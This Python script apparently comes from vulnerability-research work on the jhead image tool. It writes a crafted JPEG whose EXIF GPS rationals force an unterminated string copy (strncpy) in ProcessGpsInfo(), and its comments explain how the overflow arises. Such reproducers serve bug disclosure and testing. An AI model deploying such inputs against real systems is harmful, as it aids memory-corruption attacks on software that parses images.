#!/usr/bin/env python3
"""
VULN 002 PoC generator: GPS strncpy missing null-termination.

Constructs a minimal JPEG/EXIF with GPS IFD where each URATIONAL component
has denominator = 1000000 (>= 10^6), forcing digits=6 in ProcessGpsInfo().
This makes FmtString = "%9.6fd %9.6fm %9.6fs" and snprintf produces a 32-char
TempString, which overflows strncpy(GpsLat+2, TempString, 29) leaving GpsLat
without a null terminator at position 30 (within the 32-byte buffer).
"""

import struct
import os

# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------

def pack_ifd_entry(tag, fmt, components, value_or_offset):
    """Pack a 12-byte little-endian TIFF IFD entry."""
    return struct.pack('<HHII', tag, fmt, components, value_or_offset)

def pack_rational(numerator, denominator):
    """Pack an 8-byte URATIONAL (two uint32s)."""
    return struct.pack('<II', numerator, denominator)

# ---------------------------------------------------------------------------
# TIFF format and tag constants
# ---------------------------------------------------------------------------
FMT_ASCII    = 2   # 1 byte / component
FMT_LONG     = 4   # 4 bytes / component
FMT_URATIONAL = 5  # 8 bytes / component (numerator + denominator, both uint32)

TAG_GPS_IFD      = 0x8825
TAG_GPS_LAT_REF  = 0x0001
TAG_GPS_LAT      = 0x0002
TAG_GPS_LONG_REF = 0x0003
TAG_GPS_LONG     = 0x0004

# ---------------------------------------------------------------------------
# Offset layout (all from TIFF base = 0):
#
#   0 -  7: TIFF header          (8 bytes)
#   8 - 25: IFD0                 (2 + 1*12 + 4 = 18 bytes)
#  26 - 79: GPS IFD              (2 + 4*12 + 4 = 54 bytes)
#  80 -103: Lat URATIONAL data   (3 * 8 = 24 bytes)
# 104 -127: Lon URATIONAL data   (3 * 8 = 24 bytes)
# ---------------------------------------------------------------------------
GPS_IFD_OFFSET  = 26
LAT_DATA_OFFSET = 80
LON_DATA_OFFSET = 104
TIFF_TOTAL      = 128

# ---------------------------------------------------------------------------
# Build TIFF data
# ---------------------------------------------------------------------------

# TIFF header: byte-order mark "II" (little-endian), magic 0x002A, IFD0 at 8
tiff_header = struct.pack('<HHI', 0x4949, 0x002A, 8)   # 8 bytes

# IFD0: 1 entry (GPS IFD pointer), next-IFD = 0
ifd0  = struct.pack('<H', 1)                                         # count
ifd0 += pack_ifd_entry(TAG_GPS_IFD, FMT_LONG, 1, GPS_IFD_OFFSET)   # entry
ifd0 += struct.pack('<I', 0)                                         # next IFD
# 18 bytes total

# GPS IFD: 4 entries, next-IFD = 0
gps_ifd  = struct.pack('<H', 4)

# Entry 0 - LatRef: ASCII, 2 components "N\0", value fits inline (<=4 bytes)
lat_ref_inline = struct.unpack('<I', b'N\x00\x00\x00')[0]
gps_ifd += pack_ifd_entry(TAG_GPS_LAT_REF, FMT_ASCII, 2, lat_ref_inline)

# Entry 1 - Lat: URATIONAL, 3 components (3*8=24 bytes > 4), offset to data
gps_ifd += pack_ifd_entry(TAG_GPS_LAT, FMT_URATIONAL, 3, LAT_DATA_OFFSET)

# Entry 2 - LonRef: ASCII, 2 components "E\0", inline
lon_ref_inline = struct.unpack('<I', b'E\x00\x00\x00')[0]
gps_ifd += pack_ifd_entry(TAG_GPS_LONG_REF, FMT_ASCII, 2, lon_ref_inline)

# Entry 3 - Lon: URATIONAL, 3 components, offset to data
gps_ifd += pack_ifd_entry(TAG_GPS_LONG, FMT_URATIONAL, 3, LON_DATA_OFFSET)

gps_ifd += struct.pack('<I', 0)   # next IFD
# 2 + 4*12 + 4 = 54 bytes total

# ---------------------------------------------------------------------------
# Rational data
#
# Trigger: denominator = 1000000 forces digits=6 in ProcessGpsInfo():
#
#   den = 1000000
#   while den > 1 && digits <= 6: den /= 10, digits++
#   → 6 iterations, digits = 6
#
# FmtString becomes: "%9.6fd %9.6fm %9.6fs"  (each field: 9 total, 6 decimals)
#
# Values: 89.0 deg, 59.0 min, 59.0 sec
#   %9.6f(89.0)  = "89.000000"  (9 chars) → "89.000000d"  (10 chars)
#   %9.6f(59.0)  = "59.000000"  (9 chars) → "59.000000m"  (10 chars)
#   %9.6f(59.0)  = "59.000000"  (9 chars) → "59.000000s"  (10 chars)
#   Full string: "89.000000d 59.000000m 59.000000s"  = 32 chars
#
# strncpy(GpsLat+2, TempString, 29) copies exactly 29 bytes WITHOUT appending
# a null terminator (source length 32 >= n=29), leaving GpsLat[30] = non-null.
# ---------------------------------------------------------------------------
lat_data  = pack_rational(89_000_000, 1_000_000)   # 89.0 degrees
lat_data += pack_rational(59_000_000, 1_000_000)   # 59.0 minutes
lat_data += pack_rational(59_000_000, 1_000_000)   # 59.0 seconds

lon_data  = pack_rational(120_000_000, 1_000_000)  # 120.0 degrees
lon_data  += pack_rational(30_000_000, 1_000_000)  # 30.0 minutes
lon_data  += pack_rational(45_000_000, 1_000_000)  # 45.0 seconds

# ---------------------------------------------------------------------------
# Assemble TIFF blob and sanity-check offsets
# ---------------------------------------------------------------------------
tiff_data = tiff_header + ifd0 + gps_ifd + lat_data + lon_data

assert len(tiff_data) == TIFF_TOTAL, (
    f"TIFF size mismatch: expected {TIFF_TOTAL}, got {len(tiff_data)}")
assert len(ifd0)    == 18, f"IFD0 size wrong: {len(ifd0)}"
assert len(gps_ifd) == 54, f"GPS IFD size wrong: {len(gps_ifd)}"
assert len(lat_data) == 24 and len(lon_data) == 24

# ---------------------------------------------------------------------------
# Wrap TIFF in JPEG APP1
# ---------------------------------------------------------------------------
exif_prefix = b'Exif\x00\x00'                         # 6 bytes
app1_payload = exif_prefix + tiff_data                 # 6 + 128 = 134 bytes
app1_length  = len(app1_payload) + 2                   # +2 for the length field itself

# Minimal SOF0 (Start of Frame, baseline DCT) for a 1x1 grayscale image:
#   length(2) + precision(1) + height(2) + width(2) + ncomp(1) + comp1(3)
#   = 2 + 1 + 2 + 2 + 1 + 3 = 11  → length field = 0x000B
sof0 = b'\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00'

# Minimal SOS (Start of Scan) – jhead returns TRUE and calls ShowImageInfo() upon
# encountering M_SOS (0xDA).  Format: length(2) + ncomp(1) + comp1(2) + Ss(1) + Se(1) + Ah_Al(1)
#   length = 2 + 1 + 2 + 1 + 1 + 1 = 8 = 0x0008
sos = b'\xFF\xDA\x00\x08\x01\x01\x00\x00\x3F\x00'

# Dummy scan data + EOI so the file is at least syntactically complete.
image_data = b'\x00' * 4 + b'\xFF\xD9'

jpeg = (
    b'\xFF\xD8'                              +  # SOI
    b'\xFF\xE1'                              +  # APP1 marker
    struct.pack('>H', app1_length)           +  # APP1 length (big-endian)
    app1_payload                             +  # Exif header + TIFF
    sof0                                     +  # image frame header (1x1 grayscale)
    sos                                      +  # start of scan → jhead returns TRUE
    image_data                                  # dummy compressed data + EOI
)

# ---------------------------------------------------------------------------
# Write output
# ---------------------------------------------------------------------------
out_dir  = '/data/ylwang/non-textfuzz/target/_poc/jhead/gpsinfo_c'
out_path = os.path.join(out_dir, 'vuln_002_input.jpg')

os.makedirs(out_dir, exist_ok=True)
with open(out_path, 'wb') as fh:
    fh.write(jpeg)

print(f'[+] Written {out_path}  ({len(jpeg)} bytes)')
print(f'    APP1 length field : {app1_length}')
print(f'    TIFF data size    : {len(tiff_data)} bytes')
print(f'    GPS IFD offset    : {GPS_IFD_OFFSET}')
print(f'    Lat data offset   : {LAT_DATA_OFFSET}')
print(f'    Lon data offset   : {LON_DATA_OFFSET}')
print()
print('[*] Expected FmtString : %9.6fd %9.6fm %9.6fs')
print('[*] Expected TempString: "89.000000d 59.000000m 59.000000s" (32 chars)')
print('[*] strncpy(GpsLat+2, TempString, 29) -> copies 29 bytes, no null at GpsLat[30]')
